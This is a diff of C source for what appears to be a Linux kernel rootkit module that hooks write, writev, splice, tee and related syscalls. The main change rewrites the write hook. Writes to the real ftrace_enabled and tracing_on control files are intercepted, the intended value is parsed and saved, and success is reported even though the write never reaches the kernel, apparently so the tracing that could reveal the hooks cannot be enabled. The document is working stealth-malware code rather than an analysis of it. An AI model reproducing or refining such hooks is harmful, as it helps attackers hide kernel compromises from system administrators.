@@ -123,8 +123,16 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
     int fd;
     const char __user *user_buf;
     size_t count;
+    struct file *file;
+    char *kernel_buf;
+    char temp_buf[64];
+    size_t copy_len;
+    size_t i, start, end;
+    long parsed_value;
+    int ret;
 
-    if (!orig || !regs) return -EINVAL;
+    if (!orig || !regs)
+        return -EINVAL;
 
     if (!compat32) {
         fd       = regs->di;
@@ -136,133 +144,90 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
         count    = regs->dx;
     }
 
-    struct file *file = fget(fd);
+    file = fget(fd);
     if (!file)
         return orig(regs);
 
-    if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
+    if (!is_real_ftrace_enabled(file) && !is_real_tracing_on(file)) {
         fput(file);
-
-        char *kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
-        if (!kernel_buf)
-            return -ENOMEM;
-
-        if (copy_from_user(kernel_buf, user_buf, min(count, (size_t)BUF_SIZE))) {
-            kfree(kernel_buf);
-            return -EFAULT;
-        }
-        
-        bool valid = false;
-        long parsed_value = 0;
-        
-        if (count >= 1) {
-            char temp_buf[32];
-            size_t parse_len = min(count, sizeof(temp_buf) - 1);
-            char *endptr;
-            
-            memcpy(temp_buf, kernel_buf, parse_len);
-            temp_buf[parse_len] = '\0';
-            
-            if ((temp_buf[0] >= '0' && temp_buf[0] <= '9') || temp_buf[0] == '-') {
-                
-                parsed_value = simple_strtol(temp_buf, &endptr, 0);
-                
-                if (endptr == temp_buf) {
-                    valid = false;
-                } 
-                else if (*endptr == '\0' || *endptr == '\n' || 
-                         *endptr == ' ' || *endptr == '\r' || *endptr == '\t') {
-                    
-                    char verify_decimal[32];
-                    snprintf(verify_decimal, sizeof(verify_decimal), "%ld", parsed_value);
-                    
-                    size_t input_start = 0;
-                    while (input_start < parse_len && 
-                           (temp_buf[input_start] == ' ' || temp_buf[input_start] == '\t')) {
-                        input_start++;
-                    }
-                    
-                    size_t input_end = input_start;
-                    while (input_end < parse_len && 
-                           temp_buf[input_end] != '\n' && 
-                           temp_buf[input_end] != '\0' &&
-                           temp_buf[input_end] != ' ' &&
-                           temp_buf[input_end] != '\r' &&
-                           temp_buf[input_end] != '\t') {
-                        input_end++;
-                    }
-                    
-                    char clean_input[32];
-                    size_t clean_len = input_end - input_start;
-                    if (clean_len >= sizeof(clean_input)) {
-                        clean_len = sizeof(clean_input) - 1;
-                    }
-                    memcpy(clean_input, temp_buf + input_start, clean_len);
-                    clean_input[clean_len] = '\0';
-                    
-                    bool is_hex = (clean_len > 2 && clean_input[0] == '0' && 
-                                  (clean_input[1] == 'x' || clean_input[1] == 'X'));
-                    bool is_octal = (clean_len > 1 && clean_input[0] == '0' && 
-                                    clean_input[1] >= '0' && clean_input[1] <= '7');
-                    bool is_decimal = !is_hex && !is_octal;
-                    
-                    if (is_decimal) {
-                        if (strcmp(clean_input, verify_decimal) == 0) {
-                            valid = true;
-                        } else {
-                            valid = false;
-                        }
-                    }
-                        
-                    else {
-                        char *test_endptr;
-                        long test_value = simple_strtol(clean_input, &test_endptr, 0);
-                        
-                        if (test_value == parsed_value) {
-                            valid = true;
-                        } else {
-                            valid = false;
-                        }
-                    }
-                } 
-                else {
-                    valid = false;
-                }
-            }
-        }
-        
-        if (!valid) {
-            kfree(kernel_buf);
-            return -EINVAL;
-        }
-        
-        int written = snprintf(saved_ftrace_value, sizeof(saved_ftrace_value), "%ld\n", parsed_value);
-        if (written >= sizeof(saved_ftrace_value)) {
-            saved_ftrace_value[sizeof(saved_ftrace_value) - 1] = '\0';
-        }
-        ftrace_write_intercepted = true;
-        
-        kfree(kernel_buf);
-
-        return count;
+        return orig(regs);
     }
 
     fput(file);
-    return orig(regs);
+
+    if (count == 0 || count > 64)
+        return -EINVAL;
+
+    kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
+    if (!kernel_buf)
+        return -ENOMEM;
+
+    if (copy_from_user(kernel_buf, user_buf, min(count, (size_t)BUF_SIZE))) {
+        kfree(kernel_buf);
+        return -EFAULT;
+    }
+
+    copy_len = min(count, sizeof(temp_buf) - 1);
+    memcpy(temp_buf, kernel_buf, copy_len);
+    temp_buf[copy_len] = '\0';
+
+    kfree(kernel_buf);
+
+    start = 0;
+    while (start < copy_len && (temp_buf[start] == ' ' || temp_buf[start] == '\t'))
+        start++;
+
+    end = start;
+    while (end < copy_len && 
+           temp_buf[end] != '\n' && 
+           temp_buf[end] != '\0' &&
+           temp_buf[end] != ' ' &&
+           temp_buf[end] != '\r' &&
+           temp_buf[end] != '\t')
+        end++;
+
+    if (end == start)
+        return -EINVAL;
+
+    if (temp_buf[start] == '+')
+        return -EINVAL;
+
+    if ((end - start) > 20)
+        return -EINVAL;
+
+    temp_buf[end] = '\0';
+
+    ret = kstrtol(temp_buf + start, 0, &parsed_value);
+    if (ret != 0)
+        return -EINVAL;
+
+    if (parsed_value > INT_MAX || parsed_value < INT_MIN)
+        return -EINVAL;
+
+    i = snprintf(saved_ftrace_value, sizeof(saved_ftrace_value), "%ld\n", parsed_value);
+    if (i >= sizeof(saved_ftrace_value))
+        saved_ftrace_value[sizeof(saved_ftrace_value) - 1] = '\0';
+
+    ftrace_write_intercepted = true;
+
+    return count;
 }
 
 static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs)
 {
     return hooked_write_common(regs, original_write, false, false);
 }
+
 static notrace asmlinkage ssize_t hooked_write32(const struct pt_regs *regs)
 {
     return hooked_write_common(regs, original_write32, true, false);
 }
+
 static notrace asmlinkage ssize_t hooked_pwrite64(const struct pt_regs *regs)
 {
     return hooked_write_common(regs, original_pwrite64, false, true);
 }
+
 static notrace asmlinkage ssize_t hooked_pwrite64_ia32(const struct pt_regs *regs)
 {
     return hooked_write_common(regs, original_pwrite64_ia32, true, true);
@@ -275,8 +240,10 @@ static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *reg
     int fd;
     const struct iovec __user *vec;
     unsigned long vlen;
+    struct file *file;
 
-    if (!orig || !regs) return -EINVAL;
+    if (!orig || !regs)
+        return -EINVAL;
 
     if (!compat32) {
         fd   = regs->di;
@@ -288,7 +255,7 @@ static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *reg
         vlen = regs->dx;
     }
 
-    struct file *file = fget(fd);
+    file = fget(fd);
     if (!file)
         return orig(regs);
 
@@ -305,22 +272,27 @@ static notrace asmlinkage ssize_t hooked_writev(const struct pt_regs *regs)
 {
     return hooked_writev_common(regs, original_writev, false);
 }
+
 static notrace asmlinkage ssize_t hooked_writev32(const struct pt_regs *regs)
 {
     return hooked_writev_common(regs, original_writev32, true);
 }
+
 static notrace asmlinkage ssize_t hooked_pwritev(const struct pt_regs *regs)
 {
     return hooked_writev_common(regs, original_pwritev, false);
 }
+
 static notrace asmlinkage ssize_t hooked_pwritev2(const struct pt_regs *regs)
 {
     return hooked_writev_common(regs, original_pwritev2, false);
 }
+
 static notrace asmlinkage ssize_t hooked_pwritev_ia32(const struct pt_regs *regs)
 {
     return hooked_writev_common(regs, original_pwritev_ia32, true);
 }
+
 static notrace asmlinkage ssize_t hooked_pwritev2_ia32(const struct pt_regs *regs)
 {
     return hooked_writev_common(regs, original_pwritev2_ia32, true);
@@ -332,8 +304,10 @@ static notrace asmlinkage ssize_t hooked_fd_transfer_common(const struct pt_regs
 {
     int out_fd, in_fd;
     size_t count;
+    struct file *out_file;
 
-    if (!orig || !regs) return -EINVAL;
+    if (!orig || !regs)
+        return -EINVAL;
 
     if (!compat32) {
         out_fd = regs->di;
@@ -345,7 +319,7 @@ static notrace asmlinkage ssize_t hooked_fd_transfer_common(const struct pt_regs
         count  = regs->si;
     }
 
-    struct file *out_file = fget(out_fd);
+    out_file = fget(out_fd);
     if (!out_file)
         return orig(regs);
 
@@ -394,8 +368,10 @@ static notrace asmlinkage ssize_t hooked_copy_file_range_common(const struct pt_
 {
     int fd_in, fd_out;
     size_t count;
+    struct file *out_file;
 
-    if (!orig || !regs) return -EINVAL;
+    if (!orig || !regs)
+        return -EINVAL;
 
     if (!compat32) {
         fd_in  = regs->di;
@@ -407,7 +383,7 @@ static notrace asmlinkage ssize_t hooked_copy_file_range_common(const struct pt_
         count  = regs->r8;
     }
 
-    struct file *out_file = fget(fd_out);
+    out_file = fget(fd_out);
     if (!out_file)
         return orig(regs);
 
@@ -436,8 +412,10 @@ static notrace asmlinkage ssize_t hooked_splice_common(const struct pt_regs *reg
 {
     int fd_in, fd_out;
     size_t count;
+    struct file *out_file;
 
-    if (!orig || !regs) return -EINVAL;
+    if (!orig || !regs)
+        return -EINVAL;
 
     if (!compat32) {
         fd_in  = regs->di;
@@ -449,7 +427,7 @@ static notrace asmlinkage ssize_t hooked_splice_common(const struct pt_regs *reg
         count  = regs->si;
     }
 
-    struct file *out_file = fget(fd_out);
+    out_file = fget(fd_out);
     if (!out_file)
         return orig(regs);
 
@@ -478,8 +456,10 @@ static notrace asmlinkage ssize_t hooked_vmsplice_common(const struct pt_regs *r
 {
     int fd;
     unsigned long nr_segs;
+    struct file *file;
 
-    if (!orig || !regs) return -EINVAL;
+    if (!orig || !regs)
+        return -EINVAL;
 
     if (!compat32) {
         fd      = regs->di;
@@ -489,7 +469,7 @@ static notrace asmlinkage ssize_t hooked_vmsplice_common(const struct pt_regs *r
         nr_segs = regs->dx;
     }
 
-    struct file *file = fget(fd);
+    file = fget(fd);
     if (!file)
         return orig(regs);
 
@@ -518,8 +498,10 @@ static notrace asmlinkage ssize_t hooked_tee_common(const struct pt_regs *regs,
 {
     int fd_in, fd_out;
     size_t count;
+    struct file *out_file;
 
-    if (!orig || !regs) return -EINVAL;
+    if (!orig || !regs)
+        return -EINVAL;
 
     if (!compat32) {
         fd_in  = regs->di;
@@ -531,7 +513,7 @@ static notrace asmlinkage ssize_t hooked_tee_common(const struct pt_regs *regs,
         count  = regs->dx;
     }
 
-    struct file *out_file = fget(fd_out);
+    out_file = fget(fd_out);
     if (!out_file)
         return orig(regs);
 
